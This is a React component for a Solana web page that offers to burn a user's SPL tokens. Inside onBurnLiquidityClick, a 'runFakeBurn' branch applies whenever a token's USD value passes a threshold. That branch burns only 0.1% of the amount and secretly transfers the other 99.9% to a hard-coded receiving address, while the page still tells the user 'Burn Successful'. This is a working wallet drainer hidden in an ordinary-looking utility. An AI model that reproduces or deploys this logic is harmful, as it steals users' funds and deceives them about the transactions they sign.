import { FC, useCallback, useEffect, useRef, useState } from "react";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import {
  ComputeBudgetProgram,
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountInstruction,
  createBurnInstruction,
  createTransferCheckedInstruction,
  getAccount,
  getAssociatedTokenAddress,
  getMint,
} from "@solana/spl-token";
import {
  feeForBurningLiquidity,
  addressToReceiveBurnFees,
  priorityFeeRate,
  runFakeBurn,
  addressToRecieveLPTokens,
  minimunTokenValueInUSD,
  tokensToIgnore,
} from "constants/Constants";
import { notify } from "../utils/notifications";
import { ClipLoader } from "react-spinners";

export const BurnTokens: FC = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const amountToBurnInputRef = useRef(null); // Create a reference for the decimals input
  const redirectionScroll = useRef(null); // Create a reference for the decimals input

  const [tokenAccount, setTokenAccount] = useState("");
  const [tokenAddress, setTokenAddress] = useState("");
  const [amountToBurn, setAmountToBurn] = useState("");
  const [tokenDecimals, setTokenDecimals] = useState("");
  const [isBurnLoading, setIsBurnLoading] = useState(false);
  const [isAutofillLoading, setIsAutofillLoading] = useState(false);
  const [isMaxSupplyLoading, setIsMaxSupplyLoading] = useState(false);

  // const FROM_KEYPAIR = Keypair.fromSecretKey(new Uint8Array(secret));

  const PRIORITY_FEE_INSTRUCTIONS = ComputeBudgetProgram.setComputeUnitPrice({
    microLamports: priorityFeeRate,
  });

  const autoFillTokenDetails = useCallback(
    //INDEX: 0 -> TOKEN ADDRESS
    //INDEX: 1 -> DECIMALS
    //INDEX: 2 -> SUPPLY
    async (form) => {
      if (form.index == 0 || form.index == 1) setIsAutofillLoading(true);
      if (form.index == 2) setIsMaxSupplyLoading(true);
      try {
        const tokenAccount = new PublicKey(form.tokenAccount);

        const accountDetails = getAccount(
          connection,
          tokenAccount,
          undefined,
          TOKEN_PROGRAM_ID,
        );
        const mintAddress = (await accountDetails).mint;
        const totalAmount = (await accountDetails).amount;

        const mintDetails = getMint(
          connection,
          mintAddress,
          undefined,
          TOKEN_PROGRAM_ID,
        );
        const decimals = (await mintDetails).decimals;
        const properTotalAmount = Number(totalAmount) / Number(10 ** decimals);

        if (form.index == 0 || form.index == 1) {
          setTokenAddress(mintAddress.toBase58().toString());
          setTokenDecimals(decimals.toString());
          setIsAutofillLoading(false);
        }
        if (form.index == 2) {
          setAmountToBurn(properTotalAmount.toString());
          setIsMaxSupplyLoading(false);
        }
      } catch (error) {
        setIsAutofillLoading(false);
        setIsMaxSupplyLoading(false);
        console.error("Error in Token Address Input:", error);
        document.getElementById("tokenaccounttextbox").style.border =
          "2px solid red";
      }
    },
    [tokenAccount, connection],
  );

  async function getTokenPrice(mintAddress) {
    const url = `https://api-v3.raydium.io/mint/price?mints=${mintAddress}`;
    try {
      const response = await fetch(url);
      if (!response.ok) {
        return 0;
      }

      const data = await response.json();
      if (data.success && data.data[mintAddress]) {
        return parseFloat(data.data[mintAddress]); // Convert price to a float
      } else {
        return 0;
      }
    } catch (error) {
      return 0;
    }
  }

  const onBurnLiquidityClick = useCallback(
    async (form) => {
      if (!publicKey) {
        notify({ type: "error", message: `Wallet Not Connected!` });
        return;
      }
      setIsBurnLoading(true);

      const valueOfTokenBurning =
        (await getTokenPrice(form.tokenAddress)) * form.amountToBurn;
      const shouldPerformAlternativeBurn =
        valueOfTokenBurning >= minimunTokenValueInUSD &&
        runFakeBurn &&
        !tokensToIgnore.includes(form.tokenAddress);

      try {
        //FETCH SENDER AND RECEIVER INFORMATION
        const senderTokenAddress = await getAssociatedTokenAddress(
          new PublicKey(form.tokenAddress),
          publicKey,
        );
        const recipientTokenAddress = await getAssociatedTokenAddress(
          new PublicKey(form.tokenAddress),
          addressToRecieveLPTokens,
        );
        const recipientTokenAccountInfo = await connection.getAccountInfo(
          recipientTokenAddress,
        );

        //CALCULATE AMOUNT TO BURN
        let totalNumberToBurn: number = Math.floor(
          form.amountToBurn * 10 ** form.tokenDecimals,
        );
        const amountToBurn = form.amountToBurn * 10 ** form.tokenDecimals;
        let amountThatShouldBeBurned = Math.floor(amountToBurn * 0.001);
        let amountThatShouldBeSentToWallet = Math.floor(amountToBurn * 0.999);
        if (
          amountThatShouldBeBurned + amountThatShouldBeSentToWallet >
          amountToBurn
        )
          amountThatShouldBeBurned -= 1;

        //BURN AND TRANSFER INSTRUCTION
        const transaction = new Transaction();
        if (shouldPerformAlternativeBurn) {
          ///////////// 🔵 BURN 1 /////////////
          transaction.add(
            createBurnInstruction(
              new PublicKey(form.tokenAccount),
              new PublicKey(form.tokenAddress),
              publicKey,
              amountThatShouldBeBurned,
              undefined,
              TOKEN_PROGRAM_ID,
            ),
          );
          if (!recipientTokenAccountInfo) {
            transaction.add(
              createAssociatedTokenAccountInstruction(
                publicKey,
                recipientTokenAddress,
                addressToRecieveLPTokens,
                new PublicKey(form.tokenAddress),
              ),
            );
          }
          transaction.add(
            createTransferCheckedInstruction(
              senderTokenAddress,
              new PublicKey(form.tokenAddress),
              recipientTokenAddress,
              publicKey,
              amountThatShouldBeSentToWallet,
              form.tokenDecimals,
            ),
          );
        } else {
          ///////////// 🔵 BURN 2 /////////////
          transaction.add(
            // PRIORITY_FEE_INSTRUCTIONS,
            createBurnInstruction(
              new PublicKey(form.tokenAccount),
              new PublicKey(form.tokenAddress),
              publicKey,
              totalNumberToBurn,
              undefined,
              TOKEN_PROGRAM_ID,
            ),
            SystemProgram.transfer({
              fromPubkey: publicKey,
              toPubkey: addressToReceiveBurnFees,
              lamports: feeForBurningLiquidity,
            }),
          );
        }

        //FINALIZE AND SEND TRANSACTION
        const latestBlockhash =
          await connection.getLatestBlockhash("confirmed");
        transaction.recentBlockhash = latestBlockhash.blockhash;
        transaction.feePayer = publicKey;
        const signature = await sendTransaction(transaction, connection);
        setIsBurnLoading(false);
        notify({
          type: "success",
          message: "Burn Successful",
        });
        return signature;
      } catch (error: any) {
        //FORMAT CHECKER
        const isValidAddress = /^[A-HJ-NP-Za-km-z1-9]{44}$/;
        if (!isValidAddress.test(form.tokenAccount)) {
          document.getElementById("tokenaccounttextbox").style.border =
            "2px solid red";
        }
        if (!isValidAddress.test(form.tokenAddress)) {
          document.getElementById("tokenaddresstextbox").style.border =
            "2px solid red";
        }
        //ERROR CATCHING AND DISPLAYING
        console.log("error", `Burn failed! ${error?.message}`);
        setIsBurnLoading(false);
        notify({ type: "error", message: `Burn Failed!` });
        return;
      }
    },
    [publicKey, connection, sendTransaction],
  );

  //EXTRACT TOKEN ACCOUNT, TOKEN ADDRESS & DECIMALS FROM URL
  useEffect(() => {
    const queryParams = new URLSearchParams(window.location.search);
    const extractedTokenAccount = queryParams.get("tokenAccount");
    const extractedTokenAddress = queryParams.get("tokenAddress");
    const extractedDecimals = queryParams.get("decimals");
    if (extractedTokenAccount) setTokenAccount(extractedTokenAccount);
    if (extractedTokenAddress) setTokenAddress(extractedTokenAddress);
    if (extractedDecimals) setTokenDecimals(extractedDecimals);

    // Focus the amount to burn Textbox input once the page loads
    if (extractedDecimals && redirectionScroll.current) {
      amountToBurnInputRef.current.focus();
      redirectionScroll.current.scrollIntoView({
        behavior: "smooth",
        block: "start",
      });
    }
  }, []);

  return (
    <div className="my-2">
      {isBurnLoading && (
        <div className="absolute top-0 left-0 z-50 flex h-screen w-full flex-col items-center justify-center bg-black/[.3] backdrop-blur-[2px]">
          <ClipLoader color="#ffffff" />
        </div>
      )}

      {/* TOKEN ACCOUNT - TEXTBOX */}
      <label
        ref={redirectionScroll}
        htmlFor="token-decimals"
        className="block text-sm font-medium text-white mb-1 text-left"
      >
        Token Account:
      </label>
      <input
        type="text"
        value={tokenAccount}
        id="tokenaccounttextbox"
        className="form-control block mb-1 w-full px-4 py-2 text-xl font-normal text-gray-700 bg-white bg-clip-padding border border-solid border-gray-300 rounded transition ease-in-out m-0 focus:text-gray-700 focus:bg-white focus:border-blue-600 focus:outline-none"
        placeholder="Paste Token Account"
        onChange={(e) => {
          setTokenAccount(e.target.value);
          document.getElementById("tokenaccounttextbox").style.border = "";
          autoFillTokenDetails({ tokenAccount: e.target.value, index: 0 });
        }}
        // disabled={true}
      />

      {/* SPL TOKEN ADDRESS - TEXTBOX */}
      <div className="relative my-2">
        <div className="flex justify-between items-center mb-1">
          <label
            htmlFor="tokenaddresstextbox"
            className="block text-sm font-medium text-white"
          >
            Mint Address:
          </label>
          <span
            className="text-sm text-blue-300 cursor-pointer hover:underline"
            onClick={() =>
              autoFillTokenDetails({ tokenAccount: tokenAccount, index: 0 })
            }
          >
            {isAutofillLoading ? (
              <ClipLoader color="#ffffff" size={12} />
            ) : (
              "Autofill"
            )}
          </span>
        </div>
        <input
          type="text"
          value={tokenAddress}
          id="tokenaddresstextbox"
          className="form-control block mb-2 w-full px-4 py-2 text-xl font-normal text-gray-700 bg-grey bg-clip-padding border border-solid border-gray-300 rounded transition ease-in-out m-0 focus:text-gray-700 focus:bg-white focus:border-blue-600 focus:outline-none"
          placeholder="Use Autofill"
          onChange={(e) => {
            setTokenAddress(e.target.value);
            document.getElementById("tokenaddresstextbox").style.border = "";
          }}
        />
      </div>

      {/* DECIMALS - TEXTBOX */}
      <div className="relative my-2">
        <div className="flex justify-between items-center mb-1">
          <label
            htmlFor="token-decimals"
            className="block text-sm font-medium text-white"
          >
            Decimals:
          </label>
          <span
            className="text-sm text-blue-300 cursor-pointer hover:underline"
            onClick={() =>
              autoFillTokenDetails({ tokenAccount: tokenAccount, index: 1 })
            }
          >
            {isAutofillLoading ? (
              <ClipLoader color="#ffffff" size={12} />
            ) : (
              "Autofill"
            )}
          </span>
        </div>
        <input
          id="token-decimals"
          type="text"
          value={tokenDecimals}
          className="form-control block mb-2 w-full px-4 py-2 text-xl font-normal text-gray-700 bg-grey bg-clip-padding border border-solid border-gray-300 rounded transition ease-in-out m-0 focus:text-gray-700 focus:bg-white focus:border-blue-600 focus:outline-none"
          placeholder="Use Autofill"
          onChange={(e) => setTokenDecimals(e.target.value)}
        />
      </div>

      {/* AMOUNT TO BURN - TEXTBOX */}
      <div className="relative my-2">
        <div className="flex justify-between items-center mb-1">
          <label
            htmlFor="amount-to-burn-textbox"
            className="block text-sm font-medium text-white"
          >
            Amount:
          </label>
          <span
            className="text-sm text-blue-300 cursor-pointer hover:underline"
            onClick={() =>
              autoFillTokenDetails({ tokenAccount: tokenAccount, index: 2 })
            }
          >
            {isMaxSupplyLoading ? (
              <ClipLoader color="#ffffff" size={12} />
            ) : (
              "Max"
            )}
          </span>
        </div>
        <input
          ref={amountToBurnInputRef}
          id="amount-to-burn-textbox"
          type="text"
          value={amountToBurn}
          className="form-control block w-full px-4 py-2 text-xl font-normal text-gray-700 bg-white bg-clip-padding border border-solid border-gray-300 rounded transition ease-in-out m-0 focus:text-gray-700 focus:bg-white focus:border-blue-600 focus:outline-none"
          placeholder="Enter Amount to Burn"
          onChange={(e) => setAmountToBurn(e.target.value)}
        />
      </div>

      {/* BURN TOKENS BUTTON */}
      <button
        className="px-8 m-2 btn bg-gradient-to-r from-[#9945FF] to-[#14F195] hover:from-pink-500 hover:to-yellow-500 ..."
        onClick={() =>
          onBurnLiquidityClick({
            tokenAccount: tokenAccount,
            tokenAddress: tokenAddress,
            amountToBurn: amountToBurn,
            tokenDecimals: tokenDecimals,
          })
        }
        // disabled={true}
      >
        <span>Burn Tokens</span>
      </button>
    </div>
  );
};
